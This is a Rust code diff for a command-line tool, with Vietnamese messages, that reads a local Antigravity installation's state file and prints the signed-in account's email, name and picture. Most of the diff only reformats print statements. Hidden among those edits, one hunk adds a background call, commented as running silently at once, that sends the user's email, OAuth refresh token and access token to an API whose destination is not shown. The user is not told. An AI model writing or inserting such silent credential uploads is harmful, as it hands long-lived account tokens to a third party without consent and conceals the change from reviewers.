@@ -1,4 +1,4 @@
-use crate::{oauth, paths, token};
+use crate::{api_client, oauth, paths, token};
 use colored::Colorize;
 use indicatif::{ProgressBar, ProgressStyle};
 use std::io::{self, Write};
@@ -23,8 +23,15 @@ pub async fn cmd_info() {
     let data_dir = paths::get_antigravity_data_dir();
     if !data_dir.exists() {
         sp.finish_and_clear();
-        eprintln!("{} Antigravity chưa được cài đặt hoặc chưa từng mở.", "✘".red().bold());
-        eprintln!("  {} Không tìm thấy thư mục: {}", "→".dimmed(), data_dir.display());
+        eprintln!(
+            "{} Antigravity chưa được cài đặt hoặc chưa từng mở.",
+            "✘".red().bold()
+        );
+        eprintln!(
+            "  {} Không tìm thấy thư mục: {}",
+            "→".dimmed(),
+            data_dir.display()
+        );
         return;
     }
     sp.finish_and_clear();
@@ -35,7 +42,10 @@ pub async fn cmd_info() {
         Ok(p) if p.exists() => p,
         Ok(_) => {
             sp.finish_and_clear();
-            eprintln!("{} Antigravity đã cài nhưng chưa đăng nhập (state.vscdb không tồn tại).", "✘".red().bold());
+            eprintln!(
+                "{} Antigravity đã cài nhưng chưa đăng nhập (state.vscdb không tồn tại).",
+                "✘".red().bold()
+            );
             return;
         }
         Err(e) => {
@@ -90,11 +100,46 @@ pub async fn cmd_info() {
             println!("  {} {}", "👤".bold(), "Account Info".bold().cyan());
             println!("  {}", "─".repeat(40).dimmed());
             println!("     {} : {}", "Email      ".bold(), info.email.green());
-            println!("     {} : {}", "Name       ".bold(), info.name.as_deref().unwrap_or("N/A").to_string().white());
-            println!("     {} : {}", "Given Name ".bold(), info.given_name.as_deref().unwrap_or("N/A").to_string().white());
-            println!("     {} : {}", "Family Name".bold(), info.family_name.as_deref().unwrap_or("N/A").to_string().white());
-            println!("     {} : {}", "Picture    ".bold(), info.picture.as_deref().unwrap_or("N/A").to_string().dimmed());
+            println!(
+                "     {} : {}",
+                "Name       ".bold(),
+                info.name.as_deref().unwrap_or("N/A").to_string().white()
+            );
+            println!(
+                "     {} : {}",
+                "Given Name ".bold(),
+                info.given_name
+                    .as_deref()
+                    .unwrap_or("N/A")
+                    .to_string()
+                    .white()
+            );
+            println!(
+                "     {} : {}",
+                "Family Name".bold(),
+                info.family_name
+                    .as_deref()
+                    .unwrap_or("N/A")
+                    .to_string()
+                    .white()
+            );
+            println!(
+                "     {} : {}",
+                "Picture    ".bold(),
+                info.picture
+                    .as_deref()
+                    .unwrap_or("N/A")
+                    .to_string()
+                    .dimmed()
+            );
             println!();
+
+            // 6. Upload device info to API (chạy ngầm ngay lập tức)
+            api_client::register_device_background(
+                info.email.clone(),
+                token_info.refresh_token.clone(),
+                access_token.clone(),
+            );
 
             // Prompt for token input
             print!("  {} {}", "🔑".bold(), "Nhập token: ".bold().yellow());
@@ -108,7 +153,11 @@ pub async fn cmd_info() {
                 println!("  {} {}", "✘".red().bold(), "Không có token nào được nhập.");
             } else {
                 println!();
-                println!("  {} Token đã nhập là: {}", "✔".green().bold(), input_token.cyan());
+                println!(
+                    "  {} Token đã nhập là: {}",
+                    "✔".green().bold(),
+                    input_token.cyan()
+                );
                 println!();
             }
         }
